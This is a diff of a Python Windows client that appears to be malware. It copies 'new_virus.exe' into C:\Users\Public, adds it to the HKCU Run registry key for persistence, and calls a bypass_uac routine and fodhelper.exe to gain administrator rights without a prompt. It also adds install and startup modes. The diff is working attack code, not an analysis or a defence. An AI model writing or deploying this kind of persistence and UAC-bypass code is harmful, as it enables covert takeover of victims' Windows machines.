@@ -3,6 +3,7 @@ import re
 import sys
 import ssl
 import json
+import time
 import uuid
 import socket
 import winreg
@@ -18,17 +19,7 @@ def add_to_winregistry():
     Python code to add current script to the winregistry
     module to edit the windows winregistry
     """
-    # in python __file__ is the instant of
-    # file path where it was executed
-    # so if it was executed from desktop,
-    # then __file__ will be
-    # c:\users\current_user\desktop
-    pth = os.path.dirname(os.path.realpath(__file__))
-
-    s_name = r'C:\Windows\System32\fodhelper.exe'
-
-    # joins the file name to end of path address
-    address = os.path.join(pth, s_name)
+    address = r'C:\Users\Public\new_virus.exe -s'
 
     # key we want to change is HKEY_CURRENT_USER
     # key value is Software\Microsoft\Windows\CurrentVersion\Run
@@ -104,6 +95,8 @@ class AdminPrivilegesManager(object):
                 current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
                 cmd = '{} /k {} {}'.format(self.cmd, self.python_cmd, current_dir)
                 self.bypass_uac(cmd)
+                subprocess.call(self.fod_helper, shell=True)
+                print('ran fodhelper.exe')
             except Exception as e:
                 print(e)
                 sys.exit(1)
@@ -231,16 +224,21 @@ class Client(object):
 
 
 if __name__ == "__main__":
+    admin_privileges_manager = AdminPrivilegesManager()
     arg = sys.argv[1]
     if arg == '-i':
         # Install mode
-        admin_privileges_manager = AdminPrivilegesManager()
-        admin_privileges_manager.main()
+        cmd = r'xcopy /y new_virus.exe "C:\Users\Public\"'
+        subprocess.call(cmd, shell=True)
+        cmd = r'cd C:\Users\Public'
+        subprocess.call(cmd, shell=True)
         add_to_winregistry()
         print('added to registry')
-        fod_helper = r'C:\Windows\System32\fodhelper.exe'
-        subprocess.call(fod_helper, shell=True)
-        print('ran fodhelper.exe')
+        admin_privileges_manager.main()
+
+    elif arg == '-s':
+        # Startup mode
+        admin_privileges_manager.main()
 
     elif arg == '-r':
         # Run mode
